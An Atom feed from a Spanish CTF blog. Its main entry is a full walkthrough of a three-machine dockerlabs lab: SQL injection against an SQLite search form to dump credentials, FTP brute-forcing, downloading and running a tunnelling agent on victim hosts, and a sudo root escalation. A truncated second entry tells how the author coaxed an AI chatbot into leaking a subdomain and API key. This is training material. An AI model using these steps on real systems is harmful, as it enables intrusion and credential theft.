<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-09-17T20:36:01+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Road to olympus</title><link href="/posts/RoadToOlympus/" rel="alternate" type="text/html" title="Road to olympus" /><published>2024-09-17T00:00:00+00:00</published><updated>2024-09-17T00:00:00+00:00</updated><id>/posts/RoadToOlympus</id><content type="html" xml:base="/posts/RoadToOlympus/"><![CDATA[<p>Estamos ante un laboratorio que contiene 3 máquinas con distribuciones Linux creado por <strong>Patxasec</strong>. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="1-hades">1-Hades</h1>

<p>Empezamos haciendo un escaneo rápido de puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.10.10.2 <span class="nt">-b</span> 25
Open 10.10.10.2:22
Open 10.10.10.2:80
</code></pre></div></div>

<p>Encontramos los puertos <strong>22</strong> y <strong>80</strong> abiertos. Ahora hacemos un escaneo de servicios y versiones con <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.10.10.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 7e851a70b52ec635739b6477ba5f728b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0a6756221ea1aa0544f0b905756d9c36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Werkzeug/3.0.4 Python/3.12.3
|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Not A CTF
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.4 Python/3.12.3

</code></pre></div></div>

<p>No vemos nada relevante, asi que vamos a explorar la web con <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-vvvv</span> http://10.10.10.2
&lt;<span class="o">!</span><span class="nt">--</span> Guardar en KeePass y borrar al verlo.
Nueva contraseña para el servicio SSH de cerbero el perro de 3 cabezas <span class="nv">JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q</span><span class="o">====</span> <span class="nt">--</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Encontramos un hash. Tratamos de decodearlo usando <strong>base64</strong> pero no tenemos resultado. Usando <a href="https://cyberchef.io/">cyberchef</a> vemos que esta encodeado primero usando <strong>base32</strong> y luego en <strong>base64</strong> para darnos un resultado en <strong>hexadecimal</strong>. Usamos <code class="language-plaintext highlighter-rouge">xxd -r -p</code> para pasar de hexadecimal a texto simple:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q===='</span> | <span class="nb">base32</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
P0seidón2022!
</code></pre></div></div>

<p>Encontramos un password para un supuesto usuario <strong>cerbero</strong>. Probamos a conectarnos usando esas credenciales y obtenemos acceso a la primera máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh cerbero@10.10.10.2
cerbero@10.10.10.2<span class="s1">'s password: 
To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

cerbero@4657df97b944:~$
</span></code></pre></div></div>

<h3 id="pivoting">Pivoting</h3>

<p>Vamos a usar <a href="https://github.com/Nicocha30/ligolo-ng">ligolo-ng</a> para hacer el pivoting a las diferentes redes. Nos bajamos del repositorio las versiones que necesitamos y nos mandamos a la máquina víctima el agente. Le damos también permiso de ejecución.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerbero@7c938e91755b:~<span class="nv">$ </span>wget http://10.10.10.1:8000/agent <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x agent
</code></pre></div></div>

<p>En nuestro equipo nos ponemos a la escucha con el binario <code class="language-plaintext highlighter-rouge">proxy</code> y le ponemos como argumento <code class="language-plaintext highlighter-rouge">-selfcert</code> para que nos genere un certificado para la sesión. Es importante ejecutarlo como <strong>root</strong> porque debemos crear interfaces y es necesario ser root para crearlas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> ./proxy <span class="nt">-selfcert</span>
</code></pre></div></div>

<p>Desde la máquina victima ejecutamos el agente para que se conecte a nuestro proxy y que no valide el certificado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerbero@febfcab0b0a6:~<span class="nv">$ </span>./agent <span class="nt">-connect</span> 10.10.10.1:11601 <span class="nt">-ignore-cert</span>
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        <span class="nv">addr</span><span class="o">=</span><span class="s2">"10.10.10.1:11601"</span>
</code></pre></div></div>

<p>Vemos que se ha establecido la conexión. En el proxy seleccionamos la sesión recien creada con <code class="language-plaintext highlighter-rouge">session</code>. Una vez elegida ejecutamos <code class="language-plaintext highlighter-rouge">autoroute</code>. Elegimos la red a la que queremos pivotar, le indicamos que nos cree una interfaz nueva y que inicie el tunel.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ligolo-ng » INFO[0111] Agent joined.                                 <span class="nv">name</span><span class="o">=</span>cerbero@febfcab0b0a6 <span class="nv">remote</span><span class="o">=</span><span class="s2">"10.10.10.2:52042"</span>
ligolo-ng » session
? Specify a session : 1 - cerbero@febfcab0b0a6 - 10.10.10.2:52042 - ae1e5a3e-c937-46d2-b383-ef4960acca26
<span class="o">[</span>Agent : cerbero@febfcab0b0a6] » autoroute
? Select routes to add: 20.20.20.2/24? Create a new interface or use an existing one? Create a new interface
INFO[0161] Generating a random interface name...        
INFO[0161] Creating a new <span class="s2">"justego"</span> interface...        
INFO[0161] Using interface justego, creating routes...  
INFO[0161] Route 20.20.20.2/24 created.                 
? Start the tunnel? Yes
<span class="o">[</span>Agent : cerbero@febfcab0b0a6] » INFO[0164] Starting tunnel to cerbero@febfcab0b0a6
</code></pre></div></div>

<p>Si todo ha salido bien ya tendremos acceso a la máquina <strong>Poseidon</strong>.</p>

<h1 id="2-poseidon">2-Poseidon</h1>

<p>Hacemos un escaneo rápido con <code class="language-plaintext highlighter-rouge">rustscan</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 20.20.20.3 <span class="nt">-b</span> 30
Open 20.20.20.3:22
Open 20.20.20.3:80
</code></pre></div></div>

<p>Encontramos los puertos <strong>22</strong> y <strong>80</strong> abiertos. Ahora hacemos un escaneo de servicios y versiones con <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 20.20.20.3
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 41eae9708838112b1f363acbbd1abbe2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 2cd8bf01057e7a70387c7bf2ba544b20 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2037e59215dc6918dc09bb69746daec5 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.54 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Dojos El Papapasito del mar
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>En esta ocasión tampoco encontramos nada relevante. Hacemos un fuzzing a ver si encontramos algo que nos permita seguir con el ataque:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-d</span> 2 <span class="nt">-x</span> .php <span class="nt">-u</span> http://20.20.20.3
200      GET        1l        6w       34c http://20.20.20.3/database.php
200      GET      157l      357w     3863c http://20.20.20.3/buscador/oraculo.html
</code></pre></div></div>

<p>Encontramos el fichero <strong>database.php</strong> y <strong>/buscador/oraculo.html</strong>. Vemos como hace la consulta a la BBDD:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-vvvv</span> http://20.20.20.3/buscador/oraculo.html
form.addEventListener<span class="o">(</span><span class="s1">'submit'</span>, <span class="o">(</span>e<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
  e.preventDefault<span class="o">()</span><span class="p">;</span>
  const buscar <span class="o">=</span> input.value.trim<span class="o">()</span><span class="p">;</span>
  <span class="k">if</span> <span class="o">(</span>buscar <span class="o">!==</span> <span class="s1">''</span><span class="o">)</span> <span class="o">{</span>
    fetch<span class="o">(</span><span class="s1">'../database.php'</span>, <span class="o">{</span>
      method: <span class="s1">'POST'</span>,
      headers: <span class="o">{</span>
        <span class="s1">'Content-Type'</span>: <span class="s1">'application/x-www-form-urlencoded'</span>,
      <span class="o">}</span>,
      body: <span class="sb">`</span><span class="nv">buscar</span><span class="o">=</span><span class="k">${</span><span class="nv">encodeURIComponent</span><span class="p">(buscar)</span><span class="k">}</span><span class="sb">`</span>,
    <span class="o">})</span>
      .then<span class="o">((</span>response<span class="o">)</span> <span class="o">=&gt;</span> response.text<span class="o">())</span>
      .then<span class="o">((</span>data<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
        resultado.innerHTML <span class="o">=</span> data<span class="p">;</span>
      <span class="o">})</span>
      .catch<span class="o">((</span>error<span class="o">)</span> <span class="o">=&gt;</span> console.error<span class="o">(</span>error<span class="o">))</span><span class="p">;</span>
  <span class="o">}</span>

</code></pre></div></div>

<p>Probamos a ver si hay alguna <strong>SQLi</strong> en el buscador:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://20.20.20.3/database.php <span class="nt">--data</span> <span class="s1">'buscar=a'</span> <span class="nt">--dbs</span>
Parameter: buscar <span class="o">(</span>POST<span class="o">)</span>
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: <span class="nv">buscar</span><span class="o">=</span>a<span class="s2">" AND 08905=8905– wXyW
</span></code></pre></div></div>

<p>Vemos que hay una vulnerabilidad pero es un falso positivo. Probamos a ver si la BBDD es en sqlite ya que las herramientas no están preparadas para hacer inyecciones a sqlite. Le hacemos una consulta para ver los nombres de las tablas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">--data</span> <span class="s1">'buscar=select%20name%20from%20sqlite_master'</span> http://20.20.20.3/database.php
dioses_semidioses&lt;br /&gt;
sqlite_sequence&lt;br /&gt;
powers&lt;br /&gt;
usuarios&lt;br /&gt;
sqlite_autoindex_usuarios_1&lt;br /&gt;
sqlite_autoindex_usuarios_2&lt;br /&gt;
contrasena&lt;br /&gt;
sqlite_autoindex_contrasena_1&lt;br /&gt;
atlantis&lt;br /&gt;
</code></pre></div></div>

<p>Encontramos varias tablas, hacemos un dump de la tabla <strong>atlantis</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">--data</span> <span class="s1">'buscar=select%20*%20from%20atlantis'</span> http://20.20.20.3/database.php
1 | Poseidón | <span class="nv">$sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I</span><span class="o">=</span>&lt;br /&gt;
2 | megalodon | <span class="nv">$sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI</span><span class="o">=</span>&lt;br /&gt;
</code></pre></div></div>

<p>Encontramos 2 usuarios con su correspondiente contraseña. Desciframos la contraseña de la misma manera que desciframos la anterior:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI='</span> | <span class="nb">base32</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
Templ02019!
</code></pre></div></div>

<p>Nos conectamos con el usuario <strong>megalodon</strong> y la contraseña a la máquina <strong>Poseidon</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh megalodon@20.20.20.3
megalodon@20.20.20.3<span class="s1">'s password:
$ whoami
megalodon
$
</span></code></pre></div></div>

<p>Ahora necesitamos pasar el agente a la máquina Poseidon, y como tenemos el servidor web en python en la red 10.10.10.0 y esta máquina esta en el segmento 20.20.20.0 no podemos conectarnos directamente para descargar el agent. Ligolo-ng tiene una funcionalidad que sirve para hacer <strong>port forwarding</strong> y asi poder llegar de una red a otra. Ejecutamos <code class="language-plaintext highlighter-rouge">listener_add</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » listener_add <span class="nt">--addr</span> 0.0.0.0:8000 <span class="nt">--to</span> 127.0.0.1:8000
INFO[0287] Listener 0 created on remote agent!
</code></pre></div></div>

<p>Y nos descargamos el <strong>agent</strong> y le damos permisos de ejecución:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>megalodon@1f0e1fcaf473:~<span class="nv">$ </span>curl http://20.20.20.2:8000/agent <span class="nt">-O</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x agent
</code></pre></div></div>

<p>Ahora tenemos que hacer lo mismo para poder conectarnos al proxy en nuestra máquina. Hacemos <strong>port forwarding</strong> del puerto <strong>11601</strong> que es donde está a la escucha nuestro <strong>proxy</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » listener_add <span class="nt">--addr</span> 0.0.0.0:11601 <span class="nt">--to</span> 127.0.0.1:11601
INFO[0361] Listener 1 created on remote agent!
</code></pre></div></div>

<p>Esta vez en vez de conectar el agente al proxy vamos a hacer en el sentido contrario. Poner a la escucha el agente y conectarnos desde el proxy. Ponemo el agente a la escucha con el argumento <code class="language-plaintext highlighter-rouge">bind</code> y la <code class="language-plaintext highlighter-rouge">IP</code> y el <code class="language-plaintext highlighter-rouge">puerto</code> donde estará a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>megalodon@143546c5c4b6:~<span class="nv">$ </span>./agent <span class="nt">-bind</span> 0.0.0.0:7777
WARN[0000] TLS Certificate fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76 
INFO[0000] Listening on 0.0.0.0:7777...                 
</code></pre></div></div>

<p>Ahora desde el proxy nos conectamos a Poseidon y elegimos la nueva sesión:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » connect_agent <span class="nt">--ip</span> 20.20.20.3:7777
? TLS Certificate Fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76, connect? Yes
INFO[0999] Agent connected.                              <span class="nv">name</span><span class="o">=</span>megalodon@143546c5c4b6 <span class="nv">remote</span><span class="o">=</span><span class="s2">"20.20.20.3:7777"</span>
<span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » session 
? Specify a session : 2 - megalodon@143546c5c4b6 - 20.20.20.3:7777 - 34cad36b-0a5a-49eb-9314-2dd105235253[Agent : megalodon@143546c5c4b6] »  
</code></pre></div></div>

<p>En el agente vemos que la conexión ha sido establecida:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INFO[0005] Got connection from: 20.20.20.2:47572        
INFO[0005] Connection established                        <span class="nv">addr</span><span class="o">=</span><span class="s2">"20.20.20.2:47572"</span>
</code></pre></div></div>

<p>Volvemos al proxy y hacemos otro <strong>autoroute</strong> a la última red, le decimos que nos cree una interfaz nueva y que abra el túnel:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : megalodon@143546c5c4b6] » autoroute 
? Select routes to add: 30.30.30.2/24? Create a new interface or use an existing one? Create a new interface
INFO[1125] Generating a random interface name...        
INFO[1125] Creating a new <span class="s2">"guidedpenance"</span> interface...  
INFO[1125] Using interface guidedpenance, creating routes... 
INFO[1125] Route 30.30.30.2/24 created.                 
? Start the tunnel? Yes
<span class="o">[</span>Agent : megalodon@143546c5c4b6] » INFO[1127] Starting tunnel to megalodon@143546c5c4b6    
<span class="o">[</span>Agent : megalodon@143546c5c4b6] » 
</code></pre></div></div>

<h1 id="3-zeus">3-Zeus</h1>

<p>Vamos a por la última máquina. Volvemos a hacer un escaneo rápido:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 30.30.30.3 <span class="nt">-b</span> 35
Open 30.30.30.3:22
Open 30.30.30.3:21
Open 30.30.30.3:80
Open 30.30.30.3:139
Open 30.30.30.3:445
</code></pre></div></div>

<p>Buscamos que servicios y que versiones hay en los puertos <strong>21,22,80,139</strong> y <strong>445</strong> con <code class="language-plaintext highlighter-rouge">nmap -sCV</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,139,445 <span class="nt">-v</span> 30.30.30.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 73eb17b376b12663b8ed142a48e9c08c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e2c95685e511be8318238786fb943f7f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2024-09-14T23:16:11
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ZEUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 <span class="o">(</span>Xerox<span class="o">)</span>
| Names:
|   ZEUS&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ZEUS&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   ZEUS&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   OLIMPO&lt;00&gt;           Flags: &lt;group&gt;&lt;active&gt;
|   OLIMPO&lt;1d&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|_  OLIMPO&lt;1e&gt;           Flags: &lt;group&gt;&lt;active&gt;
</code></pre></div></div>

<p>No vemos nada relevante. Vamos a enumerar el servicio <strong>SMB</strong> con <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 enum4linux-ng.py <span class="nt">-A</span> 30.30.30.3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing share shared
<span class="o">[</span>+] Mapping: OK, Listing: OK

<span class="nv">$ </span>python3 enum4linux-ng.py 30.30.30.3 <span class="nt">-R</span> 1
<span class="o">[</span>+] Found user <span class="s1">'Unix User\rayito'</span> <span class="o">(</span>RID 1000<span class="o">)</span>
<span class="o">[</span>+] Found user <span class="s1">'Unix User\hercules'</span> <span class="o">(</span>RID 1001<span class="o">)</span>
</code></pre></div></div>

<p>Encontramos 2 usuarios del sistema, <strong>rayito</strong> y <strong>hercules</strong>,y un recurso compartido en el que tenemos permiso de lectura. No encontramos nada en el recurso compartido <strong>shared</strong></p>

<p>Vamos a probar a hacer un ataque de fuerza bruta al servicio <strong>FTP</strong> con el usuario <strong>hercules</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ftp_login <span class="nv">host</span><span class="o">=</span>30.30.30.3 <span class="nv">user</span><span class="o">=</span>hercules <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Login incorrect.'</span> <span class="nt">-x</span> ignore,reset,retry:code<span class="o">=</span>500
...
16:13:45 patator    INFO - 230   17     0.057 | thunder1                           |  3981 | Login successful.
</code></pre></div></div>

<p>Encontramos una credencial para acceder al <strong>FTP</strong>, nos conectamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp hercules@30.30.30.3
Connected to 30.30.30.3.
220 <span class="o">(</span>vsFTPd 3.0.5<span class="o">)</span>
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt;
</code></pre></div></div>

<p>Nos descargamos el fichero que hay:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get muerte_a_kratos.exe
</code></pre></div></div>

<p>En nuestra máquina vemos que cadenas de texto hay dentro del binario. Encontramos una cadena en <strong>base64.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings muerte_a_kratos.exe
...
<span class="nv">AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE</span><span class="o">=</span>
.. 

</code></pre></div></div>

<p>La desciframos y encontramos una posible contraseña:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
electrocut4c10n!
</code></pre></div></div>

<p>Probamos a conectarnos por <strong>ssh</strong> con el usuario <strong>rayito</strong> y obtenemos acceso a la última máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh rayito@30.30.30.3
rayito@30.30.30.3<span class="s1">'s password:
$ whoami
rayito
</span></code></pre></div></div>

<p>Podemos ejecutar cualquier cosa como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rayito@11f0a64a79da:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>rayito on 11f0a64a79da:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User rayito may run the following commands on 11f0a64a79da:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
</code></pre></div></div>

<p>Nos cambiamos a <strong>root</strong> y terminamos la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rayito@11f0a64a79da:~<span class="nv">$ </span><span class="nb">sudo </span>su
root@11f0a64a79da:/home/rayito# <span class="nb">cd
</span>root@11f0a64a79da:~# <span class="nb">whoami
</span>root
root@11f0a64a79da:~#
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="dificil" /><summary type="html"><![CDATA[Estamos ante un laboratorio que contiene 3 máquinas con distribuciones Linux creado por Patxasec. Es de nivel difícil y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Securitron</title><link href="/posts/Securitron/" rel="alternate" type="text/html" title="Securitron" /><published>2024-09-15T00:00:00+00:00</published><updated>2024-09-15T00:00:00+00:00</updated><id>/posts/Securitron</id><content type="html" xml:base="/posts/Securitron/"><![CDATA[<p><img src="/assets/images/securitron/0.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por <strong>lenam</strong> de dificultad <strong>profesional</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Empezamos buscando que dispositivos hay activos en nuestra red con <code class="language-plaintext highlighter-rouge">arp-scam</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s8 <span class="nt">--localnet</span>
10.0.2.172      08:00:27:0e:a1:1d       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Encontramos la dirección IP de nuestro server víctima <code class="language-plaintext highlighter-rouge">10.0.2.172</code>.</p>

<p>Una vez que tenemos la IP vamos a ver que puertos tiene abiertos con <code class="language-plaintext highlighter-rouge">rustscan</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.0.2.172 <span class="nt">-b</span> 20
Open 10.0.2.172:22
Open 10.0.2.172:80
</code></pre></div></div>

<p>Vemos que tiene el puerto 22 y 80 abiertos. Vamos a ver con <code class="language-plaintext highlighter-rouge">nmap -sCV</code> que versiones tienen:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.172
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 672eb14de67df9ecfb73e4eb5ebb265f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b314aa48fefc4726d1fa9325cff15ebc <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: Securitron
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
</code></pre></div></div>

<p>No encontramos nada relevante, vamos a explorar la web.</p>

<p>Entramos a la url y vemos que es un chat con una inteligencia artificial. Jugamos con la IA y al final conseguimos que nos de información relevante al dominio y a la web.</p>

<p><img src="/assets/images/securitron/1.png" alt="image" /></p>

<p>Nos a proporcionado un subdominio y una API-key.</p>

<p>Añadimos el subdominio al fichero <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.0.2.172 admin19-32.securitron.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.0.2.172 admin19-32.securitron.thl
</code></pre></div></div>

<p>Realizamos un escaneo por fuerza bruta para encontrar url relevantes:</p>

